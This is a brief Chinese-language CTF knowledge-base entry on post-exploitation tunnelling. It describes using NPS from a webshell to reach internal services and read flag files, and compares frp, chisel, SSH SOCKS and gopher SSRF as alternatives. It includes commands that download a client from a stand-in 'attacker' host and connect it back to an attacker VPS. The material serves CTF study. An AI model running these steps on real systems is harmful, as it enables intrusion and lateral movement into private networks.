---
title: NPS 内网代理 — CTF 渗透实战
category: web
tags: [proxy-tunnel, nps, frp, chisel, socks-proxy, lateral-movement]
triggers: [NPS, npc, 内网代理, 代理隧道, socks代理, frp, chisel, 内网穿透, webshell 出网]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/AICTF-NPS内网代理实战.md]
---

## Summary

在目标机器部署 NPS 客户端建立双向隧道，通过代理访问内网服务，配合 NPS 文件浏览器直接读取内网 flag。

## Key Points

- 适用于已获 webshell 但无法直接访问内网服务的场景
- NPS 客户端体积小（几 MB），适合 webshell 上传
- 文件浏览器功能 = 内网文件直读能力

## Details

### 典型用法

```bash
# 1. 通过 webshell 下载 NPS 客户端
curl http://attacker/npc -o /tmp/npc
# 2. 启动客户端连接 VPS 服务端
/tmp/npc -server=vps:8024 -vkey=xxx
# 3. 通过 NPS Web 面板的文件浏览器模块读取 flag
# → 成功读取 /challenge/flag1.txt, flag2.txt
```

### 替代方案

| 工具 | 特点 | 适用场景 |
|------|------|----------|
| NPS | Go 编写，有 Web 面板和文件浏览器 | 需要文件直读时优选 |
| frp | 类似 NPS，更成熟 | 通用代理隧道 |
| chisel | 单文件 Go 二进制，更轻量 | 限制上传体积的场景 |
| SSH -D | 已有 SSH 凭证时的 SOCKS 代理 | 已有 SSH 访问 |
| gopher SSRF | TCP 任意数据发送 | 仅有 HTTP 出站时 |

## Connections

- Related: [[ssrf-gopher-techniques]]
- Related: [[aictf-layer-breach]]
